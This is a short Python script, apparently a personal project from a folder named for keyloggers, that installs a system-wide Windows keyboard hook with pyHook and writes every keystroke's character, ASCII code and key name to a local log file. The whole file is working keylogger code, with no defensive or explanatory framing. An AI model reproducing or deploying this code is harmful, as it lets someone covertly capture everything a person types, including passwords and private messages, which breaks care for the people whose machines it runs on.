import pyHook, pythoncom, sys, logging

basicPlusLog="C:\\Bogdan's Folder\\#PROGRAMMING\\WORK\\#PROJECTS\\PYTHON PROJECTS\\KEYLOGGERS\\KeyLogger Basic PLUS\\basic_plus_log.txt"
def OnKeyboardEvent(event):
## BASIC PLUS LOG    
    logging.basicConfig(filename=basicPlusLog, level=logging.DEBUG, format='%(message)s')
    
    logging.log(10,chr(event.Ascii))
    logging.log(10,'Ascii: {}'.format(event.Ascii))
    logging.log(10,'Key: {}'.format(event.Key))
    return True
    
hookManager = pyHook.HookManager()
hookManager.KeyDown = OnKeyboardEvent
hookManager.HookKeyboard()
pythoncom.PumpMessages()
